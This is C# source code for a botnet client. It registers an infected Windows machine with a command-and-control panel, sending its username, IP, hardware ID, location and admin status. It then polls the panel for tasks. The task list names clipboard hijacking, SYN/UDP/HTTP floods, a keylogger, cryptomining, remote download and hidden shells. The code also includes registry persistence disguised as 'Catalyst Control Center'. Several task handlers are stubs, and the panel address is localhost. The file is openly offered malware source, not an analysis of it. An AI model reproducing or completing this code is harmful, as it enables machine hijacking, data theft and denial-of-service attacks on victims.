using Bot.Classes;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Net;
using System.Web;
using System.Text;
using System.Threading;
using System.IO;

namespace Bot
{
    internal static class Program
    {
        public static string[] CTask = { };
        public static bool clipon;

        private static void Main()
        {
            Register();
            Thread T = new Thread(new ThreadStart(TaskThread));
            T.Start();
            //Thread S = new Thread(new ThreadStart(startupThread));
            //S.Start();
            //Thread M = new Thread(new ThreadStart(mainThread));
            //M.Start();
            Thread U = new Thread(new ThreadStart(updateThread));
            U.Start();
        }

        private static void startupThread()
        {
            do
            {
                try
                {
                    if (!Misc.getKey("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getFileLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }

        private static void updateThread()
        {
            do
            {
                    var uriBuilder = new UriBuilder("http://localhost/update.aspx");
                    var parameters = HttpUtility.ParseQueryString(string.Empty);
                    parameters["IP"] = Identification.getIP();
                    parameters["Country"] = Identification.getCountry();
                    parameters["Region"] = Identification.getRegion();
                    parameters["HWID"] = Identification.getHWID();
                    parameters["Version"] = Settings.Botv;
                    parameters["admin"] = Identification.getAdmin().ToString();
                    uriBuilder.Port = 3951;
                    uriBuilder.Query = parameters.ToString();
                    Uri finalUrl = uriBuilder.Uri;
                    WebRequest wrURL = WebRequest.Create(finalUrl);
                    Stream objStream = wrURL.GetResponse().GetResponseStream();
                    StreamReader objSReader = new StreamReader(objStream);
                Thread.Sleep(1000);
            } while (true);
        }

        //private static void mainThread()
        //{
        //    using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
        //    {
        //        conn.Open();
        //        do
        //        {
        //            try
        //            {
        //                using (SqlCommand cmd = new SqlCommand("UPDATE bots set LastConn = @LastConn where HWID = @HWID", conn))
        //                {
        //                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
        //                    cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
        //                    cmd.ExecuteNonQuery();
        //                }
        //            }
        //            catch { }
        //            Thread.Sleep(Settings.reqInterval * 1000);
        //        } while (true);
        //    }
        //}

        private static void TaskThread()
        {
            string CTasksyn = "";
            string[] Tasks = { "clipboard", "http","syn","udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
            do
            {
                string[] NTask = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID()).ToString().Split(';');
                Thread C = new Thread(new ThreadStart(Misc.clip));  
                foreach (string x in Tasks)
                {
                    if (NTask.Contains(x))
                    {
                        if (CTask.Contains(x))
                        {
                        }
                        else
                        {
                            CTasksyn += ";" + x;
                            CTask = CTasksyn.Split(';');
                            CTasksyn.Replace(";;",";");
                            Console.WriteLine(x);
                            if(x == "clipboard")
                            {
                                clipon = true;
                                C.Start();
                            }

                            if(x == "viewvisable")
                            {
                                System.Diagnostics.Process.Start("http://www.google.com");
                            }

                            if(x == "viewhidden")
                            {
                            }
                        }
                    }
                    else
                    {
                        if (CTask.Contains(x))
                        {
                            CTask = CTask.Where(val => val != x).ToArray();
                            CTasksyn = "";
                            CTasksyn = Misc.ConvertStringArrayToString(CTask);
                            CTasksyn.Replace(";;", ";");
                            Console.WriteLine(x + " uit");
                            if (x == "clipboard")
                            {
                                clipon = false;
                                C.Abort();
                            }
                        }
                    }
                }
                Thread.Sleep(1000);
            } while (true);
        }

        private static bool Register()
        {
            try
            {
                var uriBuilder = new UriBuilder("http://localhost/regi.aspx");
                var parameters = HttpUtility.ParseQueryString(string.Empty);
                parameters["PCName"] = Identification.getUsername();
                parameters["IP"] = Identification.getIP();
                parameters["CPU"] = Identification.getCPU();
                parameters["GPU"] = Identification.getGPU();
                parameters["OS"] = Identification.getOS();
                parameters["Country"] = Identification.getCountry();
                parameters["Region"] = Identification.getRegion();
                parameters["HWID"] = Identification.getHWID();
                parameters["Version"] = Settings.Botv;
                parameters["admin"] = Identification.getAdmin().ToString();
                parameters["TaskAmount"] = CTask.Length.ToString();
                uriBuilder.Port = 3951;
                uriBuilder.Query = parameters.ToString();
                Uri finalUrl = uriBuilder.Uri;
                WebRequest wrURL = WebRequest.Create(finalUrl);
                Stream objStream = wrURL.GetResponse().GetResponseStream();
                StreamReader objSReader = new StreamReader(objStream);
                return true;
            }
            catch
            {
                return false;
            }
        }

    }
}